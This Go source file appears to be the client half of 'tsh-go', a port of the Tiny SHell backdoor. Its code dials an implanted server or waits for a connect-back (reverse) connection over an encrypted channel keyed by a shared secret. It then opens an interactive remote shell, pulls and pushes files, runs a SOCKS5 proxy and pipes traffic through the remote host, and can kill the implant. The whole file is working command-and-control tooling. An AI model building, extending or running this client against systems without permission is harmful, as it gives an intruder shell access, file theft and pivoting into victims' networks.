package client

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	terminal "golang.org/x/term"
)

type RunShellArgs struct {
	Command string
}

type GetFileArgs struct {
	Src string
	Dst string
}

type PutFileArgs struct {
	Src string
	Dst string
}

type Socks5Args struct {
	Socks5Addr string
}

type PipeArgs struct {
	TargetAddr string
}

func Run(secret []byte, host string, port int, mode uint8, arg any) {
	var isConnectBack bool

	if host == "cb" {
		isConnectBack = true
	}

	waitForConnection := func() *pel.PktEncLayer {
		if isConnectBack {
			addr := fmt.Sprintf(":%d", port)
			ln, err := pel.Listen(addr, secret, false)
			if err != nil {
				log.Println(err)
				os.Exit(1)
			}
			log.Print("Waiting for the server to connect...")
			layer, err := ln.Accept()
			ln.Close()
			log.Println("connected.")
			if err != nil {
				log.Println(err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		} else {
			addr := fmt.Sprintf("%s:%d", host, port)
			layer, err := pel.Dial(addr, secret, true)
			if err != nil {
				log.Println(err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		}
	}

	switch mode {
	case constants.Kill:
		layer := waitForConnection()
		layer.Close()
		log.Println("Server killed")
	case constants.RunShell:
		handleRunShell(waitForConnection, arg.(RunShellArgs))
	case constants.GetFile:
		handleGetFile(waitForConnection, arg.(GetFileArgs))
	case constants.PutFile:
		handlePutFile(waitForConnection, arg.(PutFileArgs))
	case constants.SOCKS5:
		handleSocks5(waitForConnection, arg.(Socks5Args))
	case constants.Pipe:
		handlePipe(waitForConnection, arg.(PipeArgs))
	}
}

func handleGetFile(waitForConnection func() *pel.PktEncLayer, arg GetFileArgs) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)

	basename := strings.ReplaceAll(arg.Src, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	destination := arg.Dst
	var writer io.Writer

	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
		progressbar.OptionSetWriter(os.Stderr),
	)

	if arg.Dst == "-" {
		// if dst is "-", write to stdout
		writer = os.Stdout
		if !terminal.IsTerminal(int(os.Stdout.Fd())) {
			// progress bar for file transfer if stdout is not a tty
			writer = io.MultiWriter(writer, bar)
		}
	} else {
		// if dst is a directory, save file to dst/basename
		// otherwise, save file to dst
		if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
			destination = filepath.Join(destination, basename)
		}

		f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
		if err != nil {
			log.Println(err)
			return
		}
		defer f.Close()

		writer = io.MultiWriter(f, bar)
	}

	err := layer.WriteVarLength([]byte(arg.Src))
	if err != nil {
		log.Println(err)
		return
	}
	_, err = utils.CopyBuffer(writer, layer, buffer)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
}

func handlePutFile(waitForConnection func() *pel.PktEncLayer, arg PutFileArgs) {
	layer := waitForConnection()
	defer layer.Close()

	var reader io.Reader
	var fsize int64
	var basename string

	if arg.Src == "-" {
		// if src is "-", read from stdin
		reader = os.Stdin
		fsize = -1
		basename = "stdin"
	} else {
		f, err := os.Open(arg.Src)
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		defer f.Close()
		reader = f

		fi, err := f.Stat()
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		fsize = fi.Size()
		basename = filepath.Base(arg.Src)
	}

	err := layer.WriteVarLength([]byte(arg.Dst))
	if err != nil {
		log.Println(err)
		return
	}
	err = layer.WriteVarLength([]byte(basename))
	if err != nil {
		log.Println(err)
		return
	}

	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
		progressbar.OptionSetWriter(os.Stderr),
	)
	var writer io.Writer = layer
	if reader != os.Stdin || (reader == os.Stdin && !terminal.IsTerminal(int(os.Stdin.Fd()))) {
		// show progress bar if:
		//   - src is not stdin
		//   - src is stdin but stdin is not a tty
		writer = io.MultiWriter(layer, bar)
	}

	_, err = utils.CopyBuffer(writer, reader, make([]byte, constants.MaxMessagesize))
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
}

func handleRunShell(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs) {
	layer := waitForConnection()
	defer layer.Close()
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	err = layer.WriteVarLength([]byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	err = layer.WriteVarLength([]byte(arg.Command))
	if err != nil {
		return
	}

	ch := make(chan struct{})
	go func() {
		utils.StreamPipe(layer, os.Stdout, make([]byte, constants.MaxMessagesize))
		ch <- struct{}{} // we can close once the remote connection is closed, no need to wait for stdin close
	}()
	go utils.StreamPipe(os.Stdin, layer, make([]byte, constants.MaxMessagesize))
	<-ch
}
func handleSocks5(waitForConnection func() *pel.PktEncLayer, arg Socks5Args) {
	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
	log.Println("Socks5 proxy listening at", l.Addr())
	for {
		conn, err := l.Accept()
		if err != nil {
			log.Println(err)
		}
		layer := waitForConnection()
		log.Println("Connection established", conn.RemoteAddr())
		wg := &sync.WaitGroup{}
		wg.Add(2)
		go func() {
			utils.StreamPipe(layer, conn, make([]byte, constants.MaxMessagesize))
			wg.Done()
		}()
		go func() {
			utils.StreamPipe(conn, layer, make([]byte, constants.MaxMessagesize))
			wg.Done()
		}()
		go func() {
			wg.Wait()
			layer.Close()
			conn.Close()
			log.Println("Connection closed", conn.RemoteAddr())
		}()
	}
}

func handlePipe(waitForConnection func() *pel.PktEncLayer, arg PipeArgs) {
	layer := waitForConnection()
	layer.WriteVarLength([]byte(arg.TargetAddr))

	ch := make(chan struct{})
	go func() {
		utils.StreamPipe(layer, os.Stdout, make([]byte, constants.MaxMessagesize))
		ch <- struct{}{} // we can close once the remote connection is closed, no need to wait for stdin close
	}()
	go utils.StreamPipe(os.Stdin, layer, make([]byte, constants.MaxMessagesize))
	<-ch
}
